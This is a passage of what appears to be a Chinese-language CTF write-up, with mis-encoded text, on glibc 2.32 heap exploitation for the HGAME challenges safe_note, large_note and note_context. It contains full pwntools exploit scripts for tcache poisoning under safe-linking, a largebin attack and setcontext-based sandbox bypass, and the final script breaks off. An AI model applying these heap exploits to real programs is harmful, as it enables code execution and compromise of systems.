bin</code>æ—¶ï¼Œ<code>fd = (0x559f965652a0 &gt;&gt; 12) ^ 0x559f965652a0</code>ã€‚</li><li>ç¬¬ä¸‰ä¸ªåŒç†ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>((<span class="number">0x559f965652a0</span> &gt;&gt; <span class="number">12</span>) ^ <span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;0x559f96565&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>((<span class="number">0x559f965652a0</span> &gt;&gt; <span class="number">12</span>) ^ <span class="number">0x559f965652a0</span>)</span><br><span class="line"><span class="string">&#x27;0x559acfaf37c5&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>((<span class="number">0x559f965653c0</span> &gt;&gt; <span class="number">12</span>) ^ <span class="number">0x559f96565330</span>)</span><br><span class="line"><span class="string">&#x27;0x559acfaf3655&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>ä¸éš¾æƒ³åˆ°<code>(0x559f965652a0 &gt;&gt; 12)</code>å°±æ˜¯ç¬¬ä¸€æ¬¡<code>free chunk</code>çš„<code>fd</code>æŒ‡é’ˆï¼Œä¸€ç›´å‚ä¸å¼‚æˆ–ï¼Œè¿™ä¹Ÿæ˜¯æœ‰äº›å¸ˆå‚…ä»¬å¸¸è¯´çš„<code>key</code>ã€‚</li></ul><h3 id="safe-note"><a href="#safe-note" class="headerlink" title="safe_note"></a>safe_note</h3><p><code>libc-2.32</code>ç¯å¢ƒä¸‹å¸¦æœ‰<code>edit</code>åŠŸèƒ½çš„<code>uaf</code>æ¼æ´é¢˜ç›®ï¼Œé™¤äº†ç¯å¢ƒä¸åŒï¼Œå…¶ä½™åŠŸèƒ½å‡ä¸<code>WEEK2-pwn-editable_note</code>ä¸€è‡´ã€‚</p><ul><li>ç”³è¯·9ä¸ª<code>0x80</code>å¤§å°å †å—ï¼Œé‡Šæ”¾7ä¸ªè£…æ»¡<code>tcache bin</code>ï¼Œå†é‡Šæ”¾ä¸€ä¸ªè¿›å…¥<code>unsorted bin</code>ï¼Œæ³„éœ²<code>libc_base</code>å³å¯ã€‚<strong>æ³¨ï¼šputså‡½æ•°å¯èƒ½è¢«ä½ä½â€˜\x00â€™æˆªæ–­ï¼Œå¯ä»¥ç”¨editè¿›è¡Œè°ƒæ•´ã€‚</strong></li><li>æ³„éœ²ç¬¬ä¸€ä¸ª<code>free chunk</code>çš„<code>fd</code>æŒ‡é’ˆå³<code>key</code>ï¼Œå°†<code>key</code>ä¸<code>__free_hook</code>å¼‚æˆ–ï¼ŒåŠ å¯†ç»“æœåœ¨å–å‡ºæ—¶ä¾¿ä¼šå¾—åˆ°çœŸå®çš„<code>__free_hook</code>åœ°å€ã€‚</li><li>ä¿®æ”¹ç¬¬ä¸ƒä¸ª<code>free_chunk</code>çš„<code>fd</code>æŒ‡é’ˆä¸º<code>__free_hook</code>åŠ å¯†ç»“æœï¼Œå†ç”³è¯·ä¸¤æ¬¡å †å—å¾—åˆ°<code>__free_hook</code>åœ°å€çš„æ§åˆ¶æƒï¼Œå†™å…¥<code>system</code>å³å¯ã€‚</li><li><code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-3.hgame.lwsec.cn&quot;</span>,<span class="number">30852</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&#x27;\x12&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x12</span>-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;lb=&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">key=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;key=&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">bd=free_hook^key</span><br><span class="line">edit(<span class="number">6</span>,p64(bd))</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="large-note"><a href="#large-note" class="headerlink" title="large_note"></a>large_note</h3><p><code>uaf</code>é¢˜å‹ï¼Œæ¶‰åŠ<code>libc2.32</code>ä¸‹çš„<code>house of corruption</code>åˆ©ç”¨ï¼Œä¸»è¦é€‚ç”¨äºç”³è¯·<code>largebin</code>å¤§å°çš„<code>chunk</code>é¢˜å‹ï¼Œåˆ©ç”¨<code>house of corruption</code>å¯ä»¥æ”¹å¤§ä¸€ä¸ªå·²çŸ¥åœ°å€ã€‚</p><blockquote><p><a href="https://www.anquanke.com/post/id/244018#h2-0">å‚è€ƒåšå®¢</a></p></blockquote><p>è¯¥é¢˜ä¸­<code>add</code>å †å—çš„èŒƒå›´åœ¨<code>0x500 ~ 0x900</code>ä¹‹é—´ï¼Œé‡Šæ”¾çš„å †å—æ— æ³•è¿›å…¥<code>tcache</code>ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/222362/9/23351/7369/63d38f22F7c1ab05c/2d197bc7a6b55b13.png" style="zoom: 80%;" /><p>ç”¨äºåˆ©ç”¨å®ç°<code>house of corruption</code>çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ç”³è¯·ä¸€ä¸ª<code>0x520</code>å¤§å°çš„å †å—ï¼Œå†ç”³è¯·ä¸€ä¸ª<code>0x500</code>å¤§å°çš„å †å—é¿å…åˆå¹¶ï¼Œå†ç”³è¯·ä¸€ä¸ª<code>0x510</code>å¤§å°çš„å †å—ç”¨äºåç»­è§¦å‘ä¸Šè¿°ä»£ç ï¼ˆéœ€å°äºç¬¬ä¸€ä¸ªå †å—ï¼‰ã€‚</li><li>é‡Šæ”¾æ‰ç¬¬ä¸€ä¸ªå †å—å¹¶æ³„éœ²<code>libcåŸºå€</code>ï¼Œå…¶è¿›å…¥<code>unsortedbin</code>ï¼Œå¦‚æœä¸‹ä¸€ä¸ªç”³è¯·çš„å †å—å¤§äº<code>0x520</code>ï¼Œåˆ™ä½äº<code>unsortedbin</code>ä¸­çš„<code>free chunk</code>è¿›å…¥<code>largebin</code>ï¼Œå¦åˆ™è¢«åˆ‡å‰²åˆ©ç”¨ã€‚</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/83542/16/24081/51156/63d39605Fa2a878a1/04cb52e12f5ea5d5.png" style="zoom:80%;" /><ul><li>å› æ­¤ç”³è¯·ä¸€ä¸ª<code>0x600ï¼ˆå¿…é¡»å¤§äº0x520ï¼‰</code>çš„å †å—ï¼Œä½¿ä½äº<code>unsortedbin</code>ä¸­çš„<code>free chunk</code>è¿›å…¥<code>largebin</code>ã€‚</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/196137/37/31783/63481/63d39663Faa66a407/156f7bb626f4a20d.png" style="zoom:80%;" /><ul><li>ä¿®æ”¹<code>largebin chunk</code>çš„<code>bk-&gt;nextsize</code>ä¸ºç›®æ ‡åœ°å€<code>target-0x20</code>ï¼Œæ­¤å¤„æˆ‘ä»¬çš„<code>target</code>é€‰æ‹©<code>mp_+80</code>å³å­˜å‚¨<code>tcachebin</code>æ•°é‡çš„åœ°å€ï¼Œåˆè¯•ä¸º<code>64</code>ï¼Œæ¶µç›–<code>0x10 ~ 0x400</code>ï¼Œæˆ‘ä»¬è¦å°†å…¶æ”¹æˆä¸€ä¸ªå¤§å€¼ã€‚</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/33368/1/20074/24348/63d39780F379d4b90/d2d115d721e55e75.png" style="zoom:80%;" /><ul><li>é‡Šæ”¾ç¬¬ä¸‰ä¸ªå †å—ï¼Œå…¶è¿›å…¥<code>unsortedbin</code>ï¼Œæ•…æŠ€é‡æ–½å†ç”³è¯·ä¸€ä¸ª<code>0x600</code>çš„å †å—ï¼Œä½¿ä½äº<code>unsortedbin</code>ä¸­çš„<code>free chunk</code>è¿›å…¥<code>largebin</code>ï¼Œè§¦å‘<code>house of corruption</code>ã€‚</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/186253/30/31206/38843/63d396dfFbb6bb1d1/1eb4d20f0f8ca891.png" style="zoom:80%;" /><ul><li>æ­¤æ—¶å†é‡Šæ”¾çš„å †å—éƒ½ä¼šè¿›å…¥<code>tcachebin</code>ï¼Œåˆ©ç”¨<code>double free</code>å®Œæˆå¯¹<code>__free_hook</code>çš„åŠ«æŒå³å¯ã€‚</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/31868/14/20447/25602/63d3971eFbb7d2123/dbf9023f33eeddf0.png" style="zoom:80%;" /><ul><li><code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x12&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">lb=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span>-<span class="number">0x12</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&quot;lb=&quot;</span>+<span class="built_in">hex</span>(lb))</span><br><span class="line"></span><br><span class="line">bin_num=lb+<span class="number">1979008</span>+<span class="number">80</span></span><br><span class="line">free_hook=lb+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=lb+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(bin_num-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">key=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">fk=free_hook^key</span><br><span class="line">log.success(<span class="string">&quot;key=&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(fk))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x600</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x600</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="note-context"><a href="#note-context" class="headerlink" title="note_context"></a>note_context</h3><p>ç›¸æ¯”äºä¸Šé¢˜å¼€äº†æ²™ç®±é»‘åå•ï¼Œç¦ç”¨äº†<code>execve</code>ã€‚<code>rdi</code>è½¬<code>rdx</code>å<code>setcontext+61</code>ä¸€æŠŠæ¢­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rdi2rdx</span></span><br><span class="line">.text:<span class="number">000000000014B</span>760 <span class="number">48</span> <span class="number">8B</span> <span class="number">57</span> <span class="number">08</span>                   mov     rdx, [rdi+<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000014B</span>764 <span class="number">48</span> <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                   mov     [rsp+<span class="number">0</span>C8h+var_C8], rax</span><br><span class="line">.text:<span class="number">000000000014B</span>768 FF <span class="number">52</span> <span class="number">20</span>                      call    qword ptr [rdx+<span class="number">20</span>h]</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// setcontext+61</span></span><br><span class="line">.text:<span class="number">000000000005306</span>D <span class="number">48</span> <span class="number">8B</span> A2 A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rsp, [rdx+<span class="number">0</span>A0h]</span><br><span class="line">.text:<span class="number">0000000000053074</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">9</span>A <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rbx, [rdx+<span class="number">80</span>h]</span><br><span class="line">.text:<span class="number">000000000005307B</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">6</span>A <span class="number">78</span>                   mov     rbp, [rdx+<span class="number">78</span>h]</span><br><span class="line">.text:<span class="number">000000000005307F</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">62</span> <span class="number">48</span>                   mov     r12, [rdx+<span class="number">48</span>h]</span><br><span class="line">.text:<span class="number">0000000000053083</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">6</span>A <span class="number">50</span>                   mov     r13, [rdx+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">0000000000053087</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">72</span> <span class="number">58</span>                   mov     r14, [rdx+<span class="number">58</span>h]</span><br><span class="line">.text:<span class="number">000000000005308B</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">7</span>A <span class="number">60</span>                   mov     r15, [rdx+<span class="number">60</span>h]</span><br><span class="line">.text:<span class="number">000000000005308F</span> <span class="number">64</span> F7 <span class="number">04</span> <span class="number">25</span> <span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span>+test    dword ptr fs:<span class="number">48</span>h, <span class="number">2</span></span><br><span class="line">.text:<span class="number">000000000005308F</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">.text:<span class="number">000000000005309B</span> <span class="number">0F</span> <span class="number">84</span> B5 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>             jz      loc_53156</span><br><span class="line"></span><br><span class="line">.text:<span class="number">0000000000053156</span>                               loc_53156:                              ; CODE XREF: setcontext+<span class="number">6B</span>â†‘j</span><br><span class="line">.text:<span class="number">0000000000053156</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">8</span>A A8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rcx, [rdx+<span class="number">0</span>A8h]</span><br><span class="line">.text:<span class="number">000000000005315</span>D <span class="number">51</span>                            push    rcx</span><br><span class="line">.text:<span class="number">000000000005315</span>E <span class="number">48</span> <span class="number">8B</span> <span class="number">72</span> <span class="number">70</span>                   mov     rsi, [rdx+<span class="number">70</span>h]</span><br><span class="line">.text:<span class="number">0000000000053162</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">7</span>A <span class="number">68</span>                   mov     rdi, [rdx+<span class="number">68</span>h]</span><br><span class="line">.text:<span class="number">0000000000053166</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">8</span>A <span class="number">98</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rcx, [rdx+<span class="number">98</span>h]</span><br><span class="line">.text:<span class="number">000000000005316</span>D <span class="number">4</span>C <span class="number">8B</span> <span class="number">42</span> <span class="number">28</span>                   mov     r8, [rdx+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">0000000000053171</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">4</span>A <span class="number">30</span>                   mov     r9, [rdx+<span class="number">30</span>h]</span><br><span class="line">.text:<span class="number">0000000000053175</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">92</span> <span class="number">88</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rdx, [rdx+<span class="number">88</span>h]</span><br><span class="line">.text:<span class="number">0000000000053175</span>                               ; &#125; <span class="comment">// starts at 53030</span></span><br><span class="line">.text:<span class="number">000000000005317</span>C                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">000000000005317</span>C <span class="number">31</span> C0                         xor     eax, eax</span><br><span class="line">.text:<span class="number">000000000005317</span>E C3                            retn</span><br></pre></td></tr></table></figure><ul><li>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè‹¥è°ƒç”¨<code>open</code>å‡½æ•°æŠ¥é”™ï¼Œå¯ä»¥å°è¯•<code>pop_rax_ret</code>+<code>syscall</code>è¿›è¡Œç³»ç»Ÿè°ƒç”¨ã€‚</li><li><code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-3.hgame.lwsec.cn&quot;</span>,<span class="number">30475</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span 